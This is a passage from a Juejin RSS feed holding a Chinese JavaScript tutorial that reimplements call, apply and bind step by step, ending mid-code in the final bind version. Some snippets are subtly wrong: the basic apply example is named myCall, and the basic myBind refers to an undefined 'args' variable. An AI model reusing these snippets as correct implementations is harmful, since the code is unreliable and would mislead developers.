<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[JavaScript 手写 call、apply、bind：深入理解函数上下文绑定]]></title>    <link>https://juejin.cn/post/7605941424535470134</link>    <guid>https://juejin.cn/post/7605941424535470134</guid>    <pubDate>2026-02-12T22:57:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605941424535470134" data-draft-id="7605800124883435526" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript 手写 call、apply、bind：深入理解函数上下文绑定"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2026-02-12T22:57:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wuhen_n"/> <meta itemprop="url" content="https://juejin.cn/user/4149996261738233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript 手写 call、apply、bind：深入理解函数上下文绑定
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4149996261738233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wuhen_n
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T22:57:30.000Z" title="Thu Feb 12 2026 22:57:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    11
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>当面试官让我们手写 call、apply、bind 时，他们真正考察的是什么？这三个方法看似简单，却隐藏着 JavaScript 函数执行上下文、原型链、参数处理等核心概念。本文将从零实现，并深入理解它们的差异和应用场景。</p>
</blockquote>
<h2 data-id="heading-0">前言：为什么需要 call、apply、bind？</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>,
  <span class="hljs-title function_">sayHello</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
};

<span class="hljs-keyword">const</span> sayHelloFunc = obj.<span class="hljs-property">sayHello</span>;
obj.<span class="hljs-title function_">sayHello</span>();     <span class="hljs-comment">// "你好，我是张三" - 正确</span>
<span class="hljs-title function_">sayHelloFunc</span>();     <span class="hljs-comment">// "你好，我是undefined" - this丢失了！</span>
</code></pre>
<p>上述代码，出现问题根源是：函数的 this 在调用时才确定，取决于调用方式。那如何解决呢？使用call、apply、bind 显式绑定 this 。</p>
<h2 data-id="heading-1">call 方法的实现</h2>
<h3 data-id="heading-2">call 的基本使用</h3>
<p>call 方法用于调用一个函数，并显式指定函数的 this 值和参数列表。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">message</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${message}</span>, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>!`</span>);
}

<span class="hljs-keyword">const</span> person = { <span class="hljs-attr">name</span>: <span class="hljs-string">'zhangsan'</span> };

<span class="hljs-comment">// 原生 call 的使用</span>
greet.<span class="hljs-title function_">call</span>(person, <span class="hljs-string">'你好'</span>); <span class="hljs-comment">// "你好, zhangsan!"</span>
</code></pre>
<h3 data-id="heading-3">call 的工作原理</h3>
<ol>
<li>将函数设为对象的属性</li>
<li>使用该对象调用函数</li>
<li>删除该属性</li>
</ol>
<h3 data-id="heading-4">基础版本实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myCall</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, ...args</span>) {
  <span class="hljs-comment">// 如果context是null或undefined，则绑定到全局对象</span>
  <span class="hljs-keyword">if</span> (context == <span class="hljs-literal">null</span>) {
    context = globalThis;
  }
  <span class="hljs-comment">// 给context对象添加一个临时属性，值为当前函数</span>
  <span class="hljs-keyword">const</span> fnKey = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'fn'</span>); <span class="hljs-comment">// 使用Symbol避免属性名冲突</span>
  context[fnKey] = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// this指向调用myCall的函数</span>
  <span class="hljs-comment">// 使用context对象调用函数</span>
  <span class="hljs-keyword">const</span> result = context[fnKey](...args);
  <span class="hljs-comment">// 删除临时属性</span>
  <span class="hljs-keyword">delete</span> context[fnKey];
  <span class="hljs-keyword">return</span> result;
};
</code></pre>
<h3 data-id="heading-5">处理边界情况</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myCallEnhanced</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, ...args</span>) {
  <span class="hljs-comment">// 处理undefined和null</span>
  <span class="hljs-keyword">if</span> (context == <span class="hljs-literal">null</span>) {
    context = globalThis;
  }

  <span class="hljs-comment">// 原始值需要转换为对象，否则不能添加属性</span>
  <span class="hljs-keyword">const</span> contextType = <span class="hljs-keyword">typeof</span> context;
  <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'string'</span> ||
    contextType === <span class="hljs-string">'number'</span> ||
    contextType === <span class="hljs-string">'boolean'</span> ||
    contextType === <span class="hljs-string">'symbol'</span> ||
    contextType === <span class="hljs-string">'bigint'</span>) {
    context = <span class="hljs-title class_">Object</span>(context); <span class="hljs-comment">// 转换为包装对象</span>
  }

  <span class="hljs-comment">// 使用更安全的Symbol作为key</span>
  <span class="hljs-keyword">const</span> fnKey = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'fn'</span>);
  context[fnKey] = <span class="hljs-variable language_">this</span>;

  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> result = context[fnKey](...args);
    <span class="hljs-keyword">return</span> result;
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-comment">// 确保总是删除临时属性</span>
    <span class="hljs-keyword">delete</span> context[fnKey];
  }
};

</code></pre>
<h3 data-id="heading-6">完整实现与性能优化</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myCallFinal</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context = globalThis, ...args</span>) {
  <span class="hljs-comment">// 1. 类型检查：确保调用者是函数</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">this</span> !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Function.prototype.myCallFinal called on non-function'</span>);
  }

  <span class="hljs-comment">// 2. 处理Symbol和BigInt（ES6+）</span>
  <span class="hljs-keyword">const</span> contextType = <span class="hljs-keyword">typeof</span> context;
  <span class="hljs-keyword">let</span> finalContext = context;

  <span class="hljs-comment">// 3. 处理原始值（非严格模式下的自动装箱）</span>
  <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'string'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'number'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'boolean'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'symbol'</span>) {
    <span class="hljs-comment">// Symbol不能通过new创建，使用Object</span>
    finalContext = <span class="hljs-title class_">Object</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'bigint'</span>) {
    <span class="hljs-comment">// BigInt不能通过new创建，使用Object</span>
    finalContext = <span class="hljs-title class_">Object</span>(context);
  }
  <span class="hljs-comment">// null和undefined已经通过默认参数处理</span>

  <span class="hljs-comment">// 4. 使用Symbol创建唯一key，避免属性冲突</span>
  <span class="hljs-keyword">const</span> fnSymbol = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'callFn'</span>);

  <span class="hljs-comment">// 5. 将函数绑定到上下文对象</span>
  <span class="hljs-comment">// 使用Object.defineProperty确保属性可配置</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(finalContext, fnSymbol, {
    <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>
  });

  <span class="hljs-comment">// 6. 执行函数并获取结果</span>
  <span class="hljs-keyword">let</span> result;
  <span class="hljs-keyword">try</span> {
    result = finalContext[fnSymbol](...args);
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-comment">// 7. 清理临时属性</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">delete</span> finalContext[fnSymbol];
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// 如果上下文不可配置，忽略错误</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(<span class="hljs-string">'无法删除临时属性:'</span>, error.<span class="hljs-property">message</span>);
    }
  }

  <span class="hljs-keyword">return</span> result;
};
</code></pre>
<h2 data-id="heading-7">apply 方法的实现</h2>
<h3 data-id="heading-8">apply 的基本使用</h3>
<p>apply 和 call 的功能基本相同，唯一的区别在于参数的传递方式：</p>
<ul>
<li>call 接受参数列表</li>
<li>apply 接受参数数组</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b, c</span>) {
  <span class="hljs-keyword">return</span> a + b + c;
}
<span class="hljs-comment">// apply：参数以数组形式传递</span>
sum.<span class="hljs-title function_">apply</span>(<span class="hljs-literal">null</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
</code></pre>
<h3 data-id="heading-9">基础版本实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myCall</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, args</span>) {
  <span class="hljs-comment">// 如果context是null或undefined，则绑定到全局对象</span>
  <span class="hljs-keyword">if</span> (context == <span class="hljs-literal">null</span>) {
    context = globalThis;
  }
  <span class="hljs-comment">// 给context对象添加一个临时属性，值为当前函数</span>
  <span class="hljs-keyword">const</span> fnKey = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'fn'</span>); <span class="hljs-comment">// 使用Symbol避免属性名冲突</span>
  context[fnKey] = <span class="hljs-variable language_">this</span>; <span class="hljs-comment">// this指向调用myCall的函数</span>
  <span class="hljs-comment">// 使用context对象调用函数</span>
  <span class="hljs-keyword">const</span> result = context[fnKey](...args);
  <span class="hljs-comment">// 删除临时属性</span>
  <span class="hljs-keyword">delete</span> context[fnKey];
  <span class="hljs-keyword">return</span> result;
};
</code></pre>
<h3 data-id="heading-10">完整实现与性能优化</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myApply</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context = globalThis, argsArray</span>) {
  <span class="hljs-comment">// 1. 类型检查</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">this</span> !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Function.prototype.myApply called on non-function'</span>);
  }

  <span class="hljs-comment">// 2. 参数处理：确保argsArray是数组或类数组对象</span>
  <span class="hljs-keyword">let</span> args = [];
  <span class="hljs-keyword">if</span> (argsArray != <span class="hljs-literal">null</span>) {
    <span class="hljs-comment">// 检查是否为数组或类数组</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> argsArray !== <span class="hljs-string">'object'</span> ||
      (<span class="hljs-keyword">typeof</span> argsArray.<span class="hljs-property">length</span> !== <span class="hljs-string">'number'</span> &amp;&amp; argsArray.<span class="hljs-property">length</span> !== <span class="hljs-literal">undefined</span>)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'第二个参数必须是数组或类数组对象'</span>);
    }

    <span class="hljs-comment">// 将类数组转换为真实数组</span>
    <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(argsArray)) {
      args = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(argsArray);
    } <span class="hljs-keyword">else</span> {
      args = argsArray;
    }
  }

  <span class="hljs-comment">// 3. 使用Symbol作为唯一key</span>
  <span class="hljs-keyword">const</span> fnSymbol = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">'applyFn'</span>);

  <span class="hljs-comment">// 4. 处理原始值（与call相同）</span>
  <span class="hljs-keyword">const</span> contextType = <span class="hljs-keyword">typeof</span> context;
  <span class="hljs-keyword">let</span> finalContext = context;

  <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'string'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'number'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'boolean'</span>) {
    finalContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'symbol'</span>) {
    finalContext = <span class="hljs-title class_">Object</span>(context);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'bigint'</span>) {
    finalContext = <span class="hljs-title class_">Object</span>(context);
  }

  <span class="hljs-comment">// 5. 绑定函数到上下文</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(finalContext, fnSymbol, {
    <span class="hljs-attr">value</span>: <span class="hljs-variable language_">this</span>,
    <span class="hljs-attr">configurable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">writable</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">false</span>
  });

  <span class="hljs-comment">// 6. 执行函数</span>
  <span class="hljs-keyword">let</span> result;
  <span class="hljs-keyword">try</span> {
    result = finalContext[fnSymbol](...args);
  } <span class="hljs-keyword">finally</span> {
    <span class="hljs-comment">// 7. 清理</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">delete</span> finalContext[fnSymbol];
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// 忽略删除错误</span>
    }
  }

  <span class="hljs-keyword">return</span> result;
};
</code></pre>
<h2 data-id="heading-11">bind 方法的实现</h2>
<h3 data-id="heading-12">bind 的基本使用</h3>
<p>bind 方法创建一个新的函数，当这个新函数被调用时，它的 this 值会被绑定到指定的对象，并且可以预先传入部分参数。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">greeting, name</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${greeting}</span>, <span class="hljs-subst">${name}</span>! 我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.role}</span>`</span>);
}

<span class="hljs-keyword">const</span> context = { <span class="hljs-attr">role</span>: <span class="hljs-string">'管理员'</span> };

<span class="hljs-comment">// bind：创建新函数，稍后执行</span>
<span class="hljs-keyword">const</span> boundGreet = greet.<span class="hljs-title function_">bind</span>(context, <span class="hljs-string">'你好'</span>);
<span class="hljs-title function_">boundGreet</span>(<span class="hljs-string">'李四'</span>); 
</code></pre>
<h3 data-id="heading-13">bind 的核心特性：</h3>
<ol>
<li>返回一个新函数</li>
<li>可以预设参数（柯里化）</li>
<li>绑定this值</li>
<li>支持new操作符（特殊情况）</li>
</ol>
<h3 data-id="heading-14">基础版本实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myBind</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, ...bindArgs</span>) {
  <span class="hljs-keyword">const</span> fn = <span class="hljs-variable language_">this</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...newArgs</span>) {
        <span class="hljs-keyword">return</span> fn.<span class="hljs-title function_">apply</span>(context, [...args, ...newArgs]);
    };
};
</code></pre>
<h3 data-id="heading-15">处理 new 操作符的特殊情况</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myBindEnhanced</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context = globalThis, ...bindArgs</span>) {
  <span class="hljs-keyword">const</span> originalFunc = <span class="hljs-variable language_">this</span>;

  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> originalFunc !== <span class="hljs-string">'function'</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Function.prototype.myBindEnhanced called on non-function'</span>);
  }

  <span class="hljs-comment">// 内部函数，用于判断是否被new调用</span>
  <span class="hljs-keyword">const</span> boundFunc = <span class="hljs-keyword">function</span> (<span class="hljs-params">...callArgs</span>) {
    <span class="hljs-comment">// 关键判断：this instanceof boundFunc</span>
    <span class="hljs-comment">// 如果使用new调用，this会是boundFunc的实例</span>
    <span class="hljs-keyword">const</span> isConstructorCall = <span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> boundFunc;

    <span class="hljs-comment">// 确定最终的上下文</span>
    <span class="hljs-comment">// 如果是构造函数调用，使用新创建的对象作为this</span>
    <span class="hljs-comment">// 否则使用绑定的context</span>
    <span class="hljs-keyword">const</span> finalContext = isConstructorCall ? <span class="hljs-variable language_">this</span> : <span class="hljs-title class_">Object</span>(context);

    <span class="hljs-comment">// 合并参数</span>
    <span class="hljs-keyword">const</span> finalArgs = bindArgs.<span class="hljs-title function_">concat</span>(callArgs);

    <span class="hljs-comment">// 执行原函数</span>
    <span class="hljs-comment">// 如果原函数有返回值，需要特殊处理</span>
    <span class="hljs-keyword">const</span> result = originalFunc.<span class="hljs-title function_">apply</span>(finalContext, finalArgs);

    <span class="hljs-comment">// 构造函数调用的特殊处理</span>
    <span class="hljs-comment">// 如果原函数返回一个对象，则使用该对象</span>
    <span class="hljs-comment">// 否则返回新创建的对象（this）</span>
    <span class="hljs-keyword">if</span> (isConstructorCall) {
      <span class="hljs-keyword">if</span> (result &amp;&amp; (<span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> result === <span class="hljs-string">'function'</span>)) {
        <span class="hljs-keyword">return</span> result;
      }
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
    }

    <span class="hljs-keyword">return</span> result;
  };

  <span class="hljs-comment">// 维护原型链</span>
  <span class="hljs-comment">// 方法1：直接设置prototype（有缺陷）</span>
  <span class="hljs-comment">// boundFunc.prototype = originalFunc.prototype;</span>

  <span class="hljs-comment">// 方法2：使用空函数中转（推荐）</span>
  <span class="hljs-keyword">const</span> F = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) { };
  F.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = originalFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
  boundFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_">F</span>();
  boundFunc.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = boundFunc;

  <span class="hljs-comment">// 添加一些元信息（可选）</span>
  boundFunc.<span class="hljs-property">originalFunc</span> = originalFunc;
  boundFunc.<span class="hljs-property">bindContext</span> = context;
  boundFunc.<span class="hljs-property">bindArgs</span> = bindArgs;

  <span class="hljs-keyword">return</span> boundFunc;
};
</code></pre>
<h3 data-id="heading-16">完整实现与性能优化</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Function</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">myBindFinal</span> = (<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-comment">// 使用闭包保存Slice方法，提高性能</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">ArraySlice</span> = <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">slice</span>;

  <span class="hljs-comment">// 空函数，用于原型链维护</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">EmptyFunction</span>(<span class="hljs-params"/>) { }

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">myBindFinal</span>(<span class="hljs-params">context = globalThis, ...bindArgs</span>) {
    <span class="hljs-keyword">const</span> originalFunc = <span class="hljs-variable language_">this</span>;

    <span class="hljs-comment">// 严格的类型检查</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> originalFunc !== <span class="hljs-string">'function'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Function.prototype.bind called on non-function'</span>);
    }

    <span class="hljs-comment">// 处理原始值的上下文（非严格模式）</span>
    <span class="hljs-keyword">let</span> boundContext = context;
    <span class="hljs-keyword">const</span> contextType = <span class="hljs-keyword">typeof</span> boundContext;

    <span class="hljs-comment">// 原始值包装（与call/apply保持一致）</span>
    <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'string'</span>) {
      boundContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(boundContext);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'number'</span>) {
      boundContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Number</span>(boundContext);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'boolean'</span>) {
      boundContext = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Boolean</span>(boundContext);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'symbol'</span>) {
      boundContext = <span class="hljs-title class_">Object</span>(boundContext);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (contextType === <span class="hljs-string">'bigint'</span>) {
      boundContext = <span class="hljs-title class_">Object</span>(boundContext);
    }

    <span class="hljs-comment">// 创建绑定函数</span>
